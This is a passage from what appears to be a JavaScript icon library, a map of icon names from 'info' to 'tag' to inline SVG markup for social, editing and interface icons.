            info: '<svg width="20" height="20" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg"><path d="M12.13,11.59 C11.97,12.84 10.35,14.12 9.1,14.16 C6.17,14.2 9.89,9.46 8.74,8.37 C9.3,8.16 10.62,7.83 10.62,8.81 C10.62,9.63 10.12,10.55 9.88,11.32 C8.66,15.16 12.13,11.15 12.14,11.18 C12.16,11.21 12.16,11.35 12.13,11.59 C12.08,11.95 12.16,11.35 12.13,11.59 L12.13,11.59 Z M11.56,5.67 C11.56,6.67 9.36,7.15 9.36,6.03 C9.36,5 11.56,4.54 11.56,5.67 L11.56,5.67 Z"/><circle fill="none" stroke="#000" stroke-width="1.1" cx="10" cy="10" r="9"/></svg>',
            instagram: '<svg width="20" height="20" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg"><path d="M13.55,1H6.46C3.45,1,1,3.44,1,6.44v7.12c0,3,2.45,5.44,5.46,5.44h7.08c3.02,0,5.46-2.44,5.46-5.44V6.44 C19.01,3.44,16.56,1,13.55,1z M17.5,14c0,1.93-1.57,3.5-3.5,3.5H6c-1.93,0-3.5-1.57-3.5-3.5V6c0-1.93,1.57-3.5,3.5-3.5h8 c1.93,0,3.5,1.57,3.5,3.5V14z"/><circle cx="14.87" cy="5.26" r="1.09"/><path d="M10.03,5.45c-2.55,0-4.63,2.06-4.63,4.6c0,2.55,2.07,4.61,4.63,4.61c2.56,0,4.63-2.061,4.63-4.61 C14.65,7.51,12.58,5.45,10.03,5.45L10.03,5.45L10.03,5.45z M10.08,13c-1.66,0-3-1.34-3-2.99c0-1.65,1.34-2.99,3-2.99s3,1.34,3,2.99 C13.08,11.66,11.74,13,10.08,13L10.08,13L10.08,13z"/></svg>',
            italic: '<svg width="20" height="20" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg"><path d="M12.63,5.48 L10.15,14.52 C10,15.08 10.37,15.25 11.92,15.3 L11.72,16 L6,16 L6.2,15.31 C7.78,15.26 8.19,15.09 8.34,14.53 L10.82,5.49 C10.97,4.92 10.63,4.76 9.09,4.71 L9.28,4 L15,4 L14.81,4.69 C13.23,4.75 12.78,4.91 12.63,5.48 L12.63,5.48 Z"/></svg>',
            joomla: '<svg width="20" height="20" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg"><path d="M7.8,13.4l1.7-1.7L5.9,8c-0.6-0.5-0.6-1.5,0-2c0.6-0.6,1.4-0.6,2,0l1.7-1.7c-1-1-2.3-1.3-3.6-1C5.8,2.2,4.8,1.4,3.7,1.4 c-1.3,0-2.3,1-2.3,2.3c0,1.1,0.8,2,1.8,2.3c-0.4,1.3-0.1,2.8,1,3.8L7.8,13.4L7.8,13.4z"/><path d="M10.2,4.3c1-1,2.5-1.4,3.8-1c0.2-1.1,1.1-2,2.3-2c1.3,0,2.3,1,2.3,2.3c0,1.2-0.9,2.2-2,2.3c0.4,1.3,0,2.8-1,3.8L13.9,8 c0.6-0.5,0.6-1.5,0-2c-0.5-0.6-1.5-0.6-2,0L8.2,9.7L6.5,8"/><path d="M14.1,16.8c-1.3,0.4-2.8,0.1-3.8-1l1.7-1.7c0.6,0.6,1.5,0.6,2,0c0.5-0.6,0.6-1.5,0-2l-3.7-3.7L12,6.7l3.7,3.7 c1,1,1.3,2.4,1,3.6c1.1,0.2,2,1.1,2,2.3c0,1.3-1,2.3-2.3,2.3C15.2,18.6,14.3,17.8,14.1,16.8"/><path d="M13.2,12.2l-3.7,3.7c-1,1-2.4,1.3-3.6,1c-0.2,1-1.2,1.8-2.2,1.8c-1.3,0-2.3-1-2.3-2.3c0-1.1,0.8-2,1.8-2.3 c-0.3-1.3,0-2.7,1-3.7l1.7,1.7c-0.6,0.6-0.6,1.5,0,2c0.6,0.6,1.4,0.6,2,0l3.7-3.7"/></svg>',
            laptop: '<svg width="20" height="20" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg"><rect y="16" width="20" height="1"/><rect fill="none" stroke="#000" x="2.5" y="4.5" width="15" height="10"/></svg>',
            lifesaver: '<svg width="20" height="20" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg"><path d="M10,0.5 C4.76,0.5 0.5,4.76 0.5,10 C0.5,15.24 4.76,19.5 10,19.5 C15.24,19.5 19.5,15.24 19.5,10 C19.5,4.76 15.24,0.5 10,0.5 L10,0.5 Z M10,1.5 C11.49,1.5 12.89,1.88 14.11,2.56 L11.85,4.82 C11.27,4.61 10.65,4.5 10,4.5 C9.21,4.5 8.47,4.67 7.79,4.96 L5.58,2.75 C6.87,1.95 8.38,1.5 10,1.5 L10,1.5 Z M4.96,7.8 C4.67,8.48 4.5,9.21 4.5,10 C4.5,10.65 4.61,11.27 4.83,11.85 L2.56,14.11 C1.88,12.89 1.5,11.49 1.5,10 C1.5,8.38 1.95,6.87 2.75,5.58 L4.96,7.79 L4.96,7.8 L4.96,7.8 Z M10,18.5 C8.25,18.5 6.62,17.97 5.27,17.06 L7.46,14.87 C8.22,15.27 9.08,15.5 10,15.5 C10.79,15.5 11.53,15.33 12.21,15.04 L14.42,17.25 C13.13,18.05 11.62,18.5 10,18.5 L10,18.5 Z M10,14.5 C7.52,14.5 5.5,12.48 5.5,10 C5.5,7.52 7.52,5.5 10,5.5 C12.48,5.5 14.5,7.52 14.5,10 C14.5,12.48 12.48,14.5 10,14.5 L10,14.5 Z M15.04,12.21 C15.33,11.53 15.5,10.79 15.5,10 C15.5,9.08 15.27,8.22 14.87,7.46 L17.06,5.27 C17.97,6.62 18.5,8.25 18.5,10 C18.5,11.62 18.05,13.13 17.25,14.42 L15.04,12.21 L15.04,12.21 Z"/></svg>',
            link: '<svg width="20" height="20" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg"><path fill="none" stroke="#000" stroke-width="1.1" d="M10.625,12.375 L7.525,15.475 C6.825,16.175 5.925,16.175 5.225,15.475 L4.525,14.775 C3.825,14.074 3.825,13.175 4.525,12.475 L7.625,9.375"/><path fill="none" stroke="#000" stroke-width="1.1" d="M9.325,7.375 L12.425,4.275 C13.125,3.575 14.025,3.575 14.724,4.275 L15.425,4.975 C16.125,5.675 16.125,6.575 15.425,7.275 L12.325,10.375"/><path fill="none" stroke="#000" stroke-width="1.1" d="M7.925,11.875 L11.925,7.975"/></svg>',
            linkedin: '<svg width="20" height="20" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg"><path d="M5.77,17.89 L5.77,7.17 L2.21,7.17 L2.21,17.89 L5.77,17.89 L5.77,17.89 Z M3.99,5.71 C5.23,5.71 6.01,4.89 6.01,3.86 C5.99,2.8 5.24,2 4.02,2 C2.8,2 2,2.8 2,3.85 C2,4.88 2.77,5.7 3.97,5.7 L3.99,5.7 L3.99,5.71 L3.99,5.71 Z"/><path d="M7.75,17.89 L11.31,17.89 L11.31,11.9 C11.31,11.58 11.33,11.26 11.43,11.03 C11.69,10.39 12.27,9.73 13.26,9.73 C14.55,9.73 15.06,10.71 15.06,12.15 L15.06,17.89 L18.62,17.89 L18.62,11.74 C18.62,8.45 16.86,6.92 14.52,6.92 C12.6,6.92 11.75,7.99 11.28,8.73 L11.3,8.73 L11.3,7.17 L7.75,7.17 C7.79,8.17 7.75,17.89 7.75,17.89 L7.75,17.89 L7.75,17.89 Z"/></svg>',
            list: '<svg width="20" height="20" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg"><rect x="6" y="4" width="12" height="1"/><rect x="6" y="9" width="12" height="1"/><rect x="6" y="14" width="12" height="1"/><rect x="2" y="4" width="2" height="1"/><rect x="2" y="9" width="2" height="1"/><rect x="2" y="14" width="2" height="1"/></svg>',
            location: '<svg width="20" height="20" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg"><path fill="none" stroke="#000" stroke-width="1.01" d="M10,0.5 C6.41,0.5 3.5,3.39 3.5,6.98 C3.5,11.83 10,19 10,19 C10,19 16.5,11.83 16.5,6.98 C16.5,3.39 13.59,0.5 10,0.5 L10,0.5 Z"/><circle fill="none" stroke="#000" cx="10" cy="6.8" r="2.3"/></svg>',
            lock: '<svg width="20" height="20" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg"><rect fill="none" stroke="#000" height="10" width="13" y="8.5" x="3.5"/><path fill="none" stroke="#000" d="M6.5,8 L6.5,4.88 C6.5,3.01 8.07,1.5 10,1.5 C11.93,1.5 13.5,3.01 13.5,4.88 L13.5,8"/></svg>',
            mail: '<svg width="20" height="20" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg"><polyline fill="none" stroke="#000" points="1.4,6.5 10,11 18.6,6.5"/><path d="M 1,4 1,16 19,16 19,4 1,4 Z M 18,15 2,15 2,5 18,5 18,15 Z"/></svg>',
            menu: '<svg width="20" height="20" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg"><rect x="2" y="4" width="16" height="1"/><rect x="2" y="9" width="16" height="1"/><rect x="2" y="14" width="16" height="1"/></svg>',
            microphone: '<svg width="20" height="20" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg"><line fill="none" stroke="#000" x1="10" x2="10" y1="16.44" y2="18.5"/><line fill="none" stroke="#000" x1="7" x2="13" y1="18.5" y2="18.5"/><path fill="none" stroke="#000" stroke-width="1.1" d="M13.5 4.89v5.87a3.5 3.5 0 0 1-7 0V4.89a3.5 3.5 0 0 1 7 0z"/><path fill="none" stroke="#000" stroke-width="1.1" d="M15.5 10.36V11a5.5 5.5 0 0 1-11 0v-.6"/></svg>',
            "minus-circle": '<svg width="20" height="20" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg"><circle fill="none" stroke="#000" stroke-width="1.1" cx="9.5" cy="9.5" r="9"/><line fill="none" stroke="#000" x1="5" y1="9.5" x2="14" y2="9.5"/></svg>',
            minus: '<svg width="20" height="20" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg"><rect height="1" width="18" y="9" x="1"/></svg>',
            "more-vertical": '<svg width="20" height="20" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg"><circle cx="10" cy="3" r="2"/><circle cx="10" cy="10" r="2"/><circle cx="10" cy="17" r="2"/></svg>',
            more: '<svg width="20" height="20" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg"><circle cx="3" cy="10" r="2"/><circle cx="10" cy="10" r="2"/><circle cx="17" cy="10" r="2"/></svg>',
            move: '<svg width="20" height="20" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg"><polygon points="4,5 1,5 1,9 2,9 2,6 4,6"/><polygon points="1,16 2,16 2,18 4,18 4,19 1,19"/><polygon points="14,16 14,19 11,19 11,18 13,18 13,16"/><rect fill="none" stroke="#000" x="5.5" y="1.5" width="13" height="13"/><rect x="1" y="11" width="1" height="3"/><rect x="6" y="18" width="3" height="1"/></svg>',
            nut: '<svg width="20" height="20" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg"><polygon fill="none" stroke="#000" points="2.5,5.7 10,1.3 17.5,5.7 17.5,14.3 10,18.7 2.5,14.3"/><circle fill="none" stroke="#000" cx="10" cy="10" r="3.5"/></svg>',
            pagekit: '<svg width="20" height="20" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg"><polygon points="3,1 17,1 17,16 10,16 10,13 14,13 14,4 6,4 6,16 10,16 10,19 3,19"/></svg>',
            "paint-bucket": '<svg width="20" height="20" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg"><path d="M10.21,1 L0,11.21 L8.1,19.31 L18.31,9.1 L10.21,1 L10.21,1 Z M16.89,9.1 L15,11 L1.7,11 L10.21,2.42 L16.89,9.1 Z"/><path fill="none" stroke="#000" stroke-width="1.1" d="M6.42,2.33 L11.7,7.61"/><path d="M18.49,12 C18.49,12 20,14.06 20,15.36 C20,16.28 19.24,17 18.49,17 L18.49,17 C17.74,17 17,16.28 17,15.36 C17,14.06 18.49,12 18.49,12 L18.49,12 Z"/></svg>',
            pencil: '<svg width="20" height="20" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg"><path fill="none" stroke="#000" d="M17.25,6.01 L7.12,16.1 L3.82,17.2 L5.02,13.9 L15.12,3.88 C15.71,3.29 16.66,3.29 17.25,3.88 C17.83,4.47 17.83,5.42 17.25,6.01 L17.25,6.01 Z"/><path fill="none" stroke="#000" d="M15.98,7.268 L13.851,5.148"/></svg>',
            "phone-landscape": '<svg width="20" height="20" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg"><path fill="none" stroke="#000" d="M17,5.5 C17.8,5.5 18.5,6.2 18.5,7 L18.5,14 C18.5,14.8 17.8,15.5 17,15.5 L3,15.5 C2.2,15.5 1.5,14.8 1.5,14 L1.5,7 C1.5,6.2 2.2,5.5 3,5.5 L17,5.5 L17,5.5 L17,5.5 Z"/><circle cx="3.8" cy="10.5" r=".8"/></svg>',
            phone: '<svg width="20" height="20" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg"><path fill="none" stroke="#000" d="M15.5,17 C15.5,17.8 14.8,18.5 14,18.5 L7,18.5 C6.2,18.5 5.5,17.8 5.5,17 L5.5,3 C5.5,2.2 6.2,1.5 7,1.5 L14,1.5 C14.8,1.5 15.5,2.2 15.5,3 L15.5,17 L15.5,17 L15.5,17 Z"/><circle cx="10.5" cy="16.5" r=".8"/></svg>',
            pinterest: '<svg width="20" height="20" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg"><path d="M10.21,1 C5.5,1 3,4.16 3,7.61 C3,9.21 3.85,11.2 5.22,11.84 C5.43,11.94 5.54,11.89 5.58,11.69 C5.62,11.54 5.8,10.8 5.88,10.45 C5.91,10.34 5.89,10.24 5.8,10.14 C5.36,9.59 5,8.58 5,7.65 C5,5.24 6.82,2.91 9.93,2.91 C12.61,2.91 14.49,4.74 14.49,7.35 C14.49,10.3 13,12.35 11.06,12.35 C9.99,12.35 9.19,11.47 9.44,10.38 C9.75,9.08 10.35,7.68 10.35,6.75 C10.35,5.91 9.9,5.21 8.97,5.21 C7.87,5.21 6.99,6.34 6.99,7.86 C6.99,8.83 7.32,9.48 7.32,9.48 C7.32,9.48 6.24,14.06 6.04,14.91 C5.7,16.35 6.08,18.7 6.12,18.9 C6.14,19.01 6.26,19.05 6.33,18.95 C6.44,18.81 7.74,16.85 8.11,15.44 C8.24,14.93 8.79,12.84 8.79,12.84 C9.15,13.52 10.19,14.09 11.29,14.09 C14.58,14.09 16.96,11.06 16.96,7.3 C16.94,3.7 14,1 10.21,1"/></svg>',
            "play-circle": '<svg width="20" height="20" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg"><polygon fill="none" stroke="#000" stroke-width="1.1" points="8.5 7 13.5 10 8.5 13"/><circle fill="none" stroke="#000" stroke-width="1.1" cx="10" cy="10" r="9"/></svg>',
            play: '<svg width="20" height="20" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg"><polygon fill="none" stroke="#000" points="6.5,5 14.5,10 6.5,15"/></svg>',
            "plus-circle": '<svg width="20" height="20" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg"><circle fill="none" stroke="#000" stroke-width="1.1" cx="9.5" cy="9.5" r="9"/><line fill="none" stroke="#000" x1="9.5" y1="5" x2="9.5" y2="14"/><line fill="none" stroke="#000" x1="5" y1="9.5" x2="14" y2="9.5"/></svg>',
            plus: '<svg width="20" height="20" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg"><rect x="9" y="1" width="1" height="17"/><rect x="1" y="9" width="17" height="1"/></svg>',
            print: '<svg width="20" height="20" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg"><polyline fill="none" stroke="#000" points="4.5 13.5 1.5 13.5 1.5 6.5 18.5 6.5 18.5 13.5 15.5 13.5"/><polyline fill="none" stroke="#000" points="15.5 6.5 15.5 2.5 4.5 2.5 4.5 6.5"/><rect fill="none" stroke="#000" width="11" height="6" x="4.5" y="11.5"/><rect width="8" height="1" x="6" y="13"/><rect width="8" height="1" x="6" y="15"/></svg>',
            pull: '<svg width="20" height="20" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg"><polygon points="6.85,8 9.5,10.6 12.15,8 12.85,8.7 9.5,12 6.15,8.7"/><line fill="none" stroke="#000" x1="9.5" y1="11" x2="9.5" y2="2"/><polyline fill="none" stroke="#000" points="6,5.5 3.5,5.5 3.5,18.5 15.5,18.5 15.5,5.5 13,5.5"/></svg>',
            push: '<svg width="20" height="20" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg"><polygon points="12.15,4 9.5,1.4 6.85,4 6.15,3.3 9.5,0 12.85,3.3"/><line fill="none" stroke="#000" x1="9.5" y1="10" x2="9.5" y2="1"/><polyline fill="none" stroke="#000" points="6 5.5 3.5 5.5 3.5 18.5 15.5 18.5 15.5 5.5 13 5.5"/></svg>',
            question: '<svg width="20" height="20" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg"><circle fill="none" stroke="#000" stroke-width="1.1" cx="10" cy="10" r="9"/><circle cx="10.44" cy="14.42" r="1.05"/><path fill="none" stroke="#000" stroke-width="1.2" d="M8.17,7.79 C8.17,4.75 12.72,4.73 12.72,7.72 C12.72,8.67 11.81,9.15 11.23,9.75 C10.75,10.24 10.51,10.73 10.45,11.4 C10.44,11.53 10.43,11.64 10.43,11.75"/></svg>',
            "quote-right": '<svg width="20" height="20" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg"><path d="M17.27,7.79 C17.27,9.45 16.97,10.43 15.99,12.02 C14.98,13.64 13,15.23 11.56,15.97 L11.1,15.08 C12.34,14.2 13.14,13.51 14.02,11.82 C14.27,11.34 14.41,10.92 14.49,10.54 C14.3,10.58 14.09,10.6 13.88,10.6 C12.06,10.6 10.59,9.12 10.59,7.3 C10.59,5.48 12.06,4 13.88,4 C15.39,4 16.67,5.02 17.05,6.42 C17.19,6.82 17.27,7.27 17.27,7.79 L17.27,7.79 Z"/><path d="M8.68,7.79 C8.68,9.45 8.38,10.43 7.4,12.02 C6.39,13.64 4.41,15.23 2.97,15.97 L2.51,15.08 C3.75,14.2 4.55,13.51 5.43,11.82 C5.68,11.34 5.82,10.92 5.9,10.54 C5.71,10.58 5.5,10.6 5.29,10.6 C3.47,10.6 2,9.12 2,7.3 C2,5.48 3.47,4 5.29,4 C6.8,4 8.08,5.02 8.46,6.42 C8.6,6.82 8.68,7.27 8.68,7.79 L8.68,7.79 Z"/></svg>',
            receiver: '<svg width="20" height="20" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg"><path fill="none" stroke="#000" stroke-width="1.01" d="M6.189,13.611C8.134,15.525 11.097,18.239 13.867,18.257C16.47,18.275 18.2,16.241 18.2,16.241L14.509,12.551L11.539,13.639L6.189,8.29L7.313,5.355L3.76,1.8C3.76,1.8 1.732,3.537 1.7,6.092C1.667,8.809 4.347,11.738 6.189,13.611"/></svg>',
            reddit: '<svg width="20" height="20" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg"><path d="M19 9.05a2.56 2.56 0 0 0-2.56-2.56 2.59 2.59 0 0 0-1.88.82 10.63 10.63 0 0 0-4.14-1v-.08c.58-1.62 1.58-3.89 2.7-4.1.38-.08.77.12 1.19.57a1.15 1.15 0 0 0-.06.37 1.48 1.48 0 1 0 1.51-1.45 1.43 1.43 0 0 0-.76.19A2.29 2.29 0 0 0 12.91 1c-2.11.43-3.39 4.38-3.63 5.19 0 0 0 .11-.06.11a10.65 10.65 0 0 0-3.75 1A2.56 2.56 0 0 0 1 9.05a2.42 2.42 0 0 0 .72 1.76A5.18 5.18 0 0 0 1.24 13c0 3.66 3.92 6.64 8.73 6.64s8.74-3 8.74-6.64a5.23 5.23 0 0 0-.46-2.13A2.58 2.58 0 0 0 19 9.05zm-16.88 0a1.44 1.44 0 0 1 2.27-1.19 7.68 7.68 0 0 0-2.07 1.91 1.33 1.33 0 0 1-.2-.72zM10 18.4c-4.17 0-7.55-2.4-7.55-5.4S5.83 7.53 10 7.53 17.5 10 17.5 13s-3.38 5.4-7.5 5.4zm7.69-8.61a7.62 7.62 0 0 0-2.09-1.91 1.41 1.41 0 0 1 .84-.28 1.47 1.47 0 0 1 1.44 1.45 1.34 1.34 0 0 1-.21.72z"/><path d="M6.69 12.58a1.39 1.39 0 1 1 1.39-1.39 1.38 1.38 0 0 1-1.38 1.39z"/><path d="M14.26 11.2a1.39 1.39 0 1 1-1.39-1.39 1.39 1.39 0 0 1 1.39 1.39z"/><path d="M13.09 14.88a.54.54 0 0 1-.09.77 5.3 5.3 0 0 1-3.26 1.19 5.61 5.61 0 0 1-3.4-1.22.55.55 0 1 1 .73-.83 4.09 4.09 0 0 0 5.25 0 .56.56 0 0 1 .77.09z"/></svg>',
            refresh: '<svg width="20" height="20" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg"><path fill="none" stroke="#000" stroke-width="1.1" d="M17.08,11.15 C17.09,11.31 17.1,11.47 17.1,11.64 C17.1,15.53 13.94,18.69 10.05,18.69 C6.16,18.68 3,15.53 3,11.63 C3,7.74 6.16,4.58 10.05,4.58 C10.9,4.58 11.71,4.73 12.46,5"/><polyline fill="none" stroke="#000" points="9.9 2 12.79 4.89 9.79 7.9"/></svg>',
            reply: '<svg width="20" height="20" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg"><path d="M17.7,13.11 C16.12,10.02 13.84,7.85 11.02,6.61 C10.57,6.41 9.75,6.13 9,5.91 L9,2 L1,9 L9,16 L9,12.13 C10.78,12.47 12.5,13.19 14.09,14.25 C17.13,16.28 18.56,18.54 18.56,18.54 C18.56,18.54 18.81,15.28 17.7,13.11 L17.7,13.11 Z M14.82,13.53 C13.17,12.4 11.01,11.4 8,10.92 L8,13.63 L2.55,9 L8,4.25 L8,6.8 C8.3,6.86 9.16,7.02 10.37,7.49 C13.3,8.65 15.54,10.96 16.65,13.08 C16.97,13.7 17.48,14.86 17.68,16 C16.87,15.05 15.73,14.15 14.82,13.53 L14.82,13.53 Z"/></svg>',
            rss: '<svg width="20" height="20" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg"><circle cx="3.12" cy="16.8" r="1.85"/><path fill="none" stroke="#000" stroke-width="1.1" d="M1.5,8.2 C1.78,8.18 2.06,8.16 2.35,8.16 C7.57,8.16 11.81,12.37 11.81,17.57 C11.81,17.89 11.79,18.19 11.76,18.5"/><path fill="none" stroke="#000" stroke-width="1.1" d="M1.5,2.52 C1.78,2.51 2.06,2.5 2.35,2.5 C10.72,2.5 17.5,9.24 17.5,17.57 C17.5,17.89 17.49,18.19 17.47,18.5"/></svg>',
            search: '<svg width="20" height="20" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg"><circle fill="none" stroke="#000" stroke-width="1.1" cx="9" cy="9" r="7"/><path fill="none" stroke="#000" stroke-width="1.1" d="M14,14 L18,18 L14,14 Z"/></svg>',
            server: '<svg width="20" height="20" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg"><rect x="3" y="3" width="1" height="2"/><rect x="5" y="3" width="1" height="2"/><rect x="7" y="3" width="1" height="2"/><rect x="16" y="3" width="1" height="1"/><rect x="16" y="10" width="1" height="1"/><circle fill="none" stroke="#000" cx="9.9" cy="17.4" r="1.4"/><rect x="3" y="10" width="1" height="2"/><rect x="5" y="10" width="1" height="2"/><rect x="9.5" y="14" width="1" height="2"/><rect x="3" y="17" width="6" height="1"/><rect x="11" y="17" width="6" height="1"/><rect fill="none" stroke="#000" x="1.5" y="1.5" width="17" height="5"/><rect fill="none" stroke="#000" x="1.5" y="8.5" width="17" height="5"/></svg>',
            settings: '<svg width="20" height="20" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg"><ellipse fill="none" stroke="#000" cx="6.11" cy="3.55" rx="2.11" ry="2.15"/><ellipse fill="none" stroke="#000" cx="6.11" cy="15.55" rx="2.11" ry="2.15"/><circle fill="none" stroke="#000" cx="13.15" cy="9.55" r="2.15"/><rect x="1" y="3" width="3" height="1"/><rect x="10" y="3" width="8" height="1"/><rect x="1" y="9" width="8" height="1"/><rect x="15" y="9" width="3" height="1"/><rect x="1" y="15" width="3" height="1"/><rect x="10" y="15" width="8" height="1"/></svg>',
            shrink: '<svg width="20" height="20" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg"><polygon points="11 4 12 4 12 8 16 8 16 9 11 9"/><polygon points="4 11 9 11 9 16 8 16 8 12 4 12"/><path fill="none" stroke="#000" stroke-width="1.1" d="M12,8 L18,2"/><path fill="none" stroke="#000" stroke-width="1.1" d="M2,18 L8,12"/></svg>',
            "sign-in": '<svg width="20" height="20" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg"><polygon points="7 2 17 2 17 17 7 17 7 16 16 16 16 3 7 3"/><polygon points="9.1 13.4 8.5 12.8 11.28 10 4 10 4 9 11.28 9 8.5 6.2 9.1 5.62 13 9.5"/></svg>',
            "sign-out": '<svg width="20" height="20" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg"><polygon points="13.1 13.4 12.5 12.8 15.28 10 8 10 8 9 15.28 9 12.5 6.2 13.1 5.62 17 9.5"/><polygon points="13 2 3 2 3 17 13 17 13 16 4 16 4 3 13 3"/></svg>',
            social: '<svg width="20" height="20" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg"><line fill="none" stroke="#000" stroke-width="1.1" x1="13.4" y1="14" x2="6.3" y2="10.7"/><line fill="none" stroke="#000" stroke-width="1.1" x1="13.5" y1="5.5" x2="6.5" y2="8.8"/><circle fill="none" stroke="#000" stroke-width="1.1" cx="15.5" cy="4.6" r="2.3"/><circle fill="none" stroke="#000" stroke-width="1.1" cx="15.5" cy="14.8" r="2.3"/><circle fill="none" stroke="#000" stroke-width="1.1" cx="4.5" cy="9.8" r="2.3"/></svg>',
            soundcloud: '<svg width="20" height="20" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg"><path d="M17.2,9.4c-0.4,0-0.8,0.1-1.101,0.2c-0.199-2.5-2.399-4.5-5-4.5c-0.6,0-1.2,0.1-1.7,0.3C9.2,5.5,9.1,5.6,9.1,5.6V15h8 c1.601,0,2.801-1.2,2.801-2.8C20,10.7,18.7,9.4,17.2,9.4L17.2,9.4z"/><rect x="6" y="6.5" width="1.5" height="8.5"/><rect x="3" y="8" width="1.5" height="7"/><rect y="10" width="1.5" height="5"/></svg>',
            star: '<svg width="20" height="20" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg"><polygon fill="none" stroke="#000" stroke-width="1.01" points="10 2 12.63 7.27 18.5 8.12 14.25 12.22 15.25 18 10 15.27 4.75 18 5.75 12.22 1.5 8.12 7.37 7.27"/></svg>',
            strikethrough: '<svg width="20" height="20" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg"><path d="M6,13.02 L6.65,13.02 C7.64,15.16 8.86,16.12 10.41,16.12 C12.22,16.12 12.92,14.93 12.92,13.89 C12.92,12.55 11.99,12.03 9.74,11.23 C8.05,10.64 6.23,10.11 6.23,7.83 C6.23,5.5 8.09,4.09 10.4,4.09 C11.44,4.09 12.13,4.31 12.72,4.54 L13.33,4 L13.81,4 L13.81,7.59 L13.16,7.59 C12.55,5.88 11.52,4.89 10.07,4.89 C8.84,4.89 7.89,5.69 7.89,7.03 C7.89,8.29 8.89,8.78 10.88,9.45 C12.57,10.03 14.38,10.6 14.38,12.91 C14.38,14.75 13.27,16.93 10.18,16.93 C9.18,16.93 8.17,16.69 7.46,16.39 L6.52,17 L6,17 L6,13.02 L6,13.02 Z"/><rect x="3" y="10" width="15" height="1"/></svg>',
            table: '<svg width="20" height="20" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg"><rect x="1" y="3" width="18" height="1"/><rect x="1" y="7" width="18" height="1"/><rect x="1" y="11" width="18" height="1"/><rect x="1" y="15" width="18" height="1"/></svg>',
            "tablet-landscape": '<svg width="20" height="20" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg"><path fill="none" stroke="#000" d="M1.5,5 C1.5,4.2 2.2,3.5 3,3.5 L17,3.5 C17.8,3.5 18.5,4.2 18.5,5 L18.5,16 C18.5,16.8 17.8,17.5 17,17.5 L3,17.5 C2.2,17.5 1.5,16.8 1.5,16 L1.5,5 L1.5,5 L1.5,5 Z"/><circle cx="3.7" cy="10.5" r=".8"/></svg>',
            tablet: '<svg width="20" height="20" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg"><path fill="none" stroke="#000" d="M5,18.5 C4.2,18.5 3.5,17.8 3.5,17 L3.5,3 C3.5,2.2 4.2,1.5 5,1.5 L16,1.5 C16.8,1.5 17.5,2.2 17.5,3 L17.5,17 C17.5,17.8 16.8,18.5 16,18.5 L5,18.5 L5,18.5 L5,18.5 Z"/><circle cx="10.5" cy="16.3" r=".8"/></svg>',
            tag: '<svg width="20" height="20" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg"><path fill="none" stroke="#000" stroke-width="1.1" d="M17.5,3.71 L17.5,7.72 C17.5,7.96 17.4,8.2 17.21,8.39 L8.39,17.2 C7.99,17.6 7.33,17.6 6.93,17.2 L2.8,13.07 C2.4,12.67 2.4,12.01 2.8,11.61 L11.61,2.8 C11.81,2.6 12.08,2.5 12.34,2.5 L16.19,2.5 C16.52,2.5 16.86,2.63 17.11,2.88 C17.35,3.11 17.48,3.4 17.5,3.71 L17.5,3.71 Z"/><circle cx="14" cy="6" r="1"/></svg>',
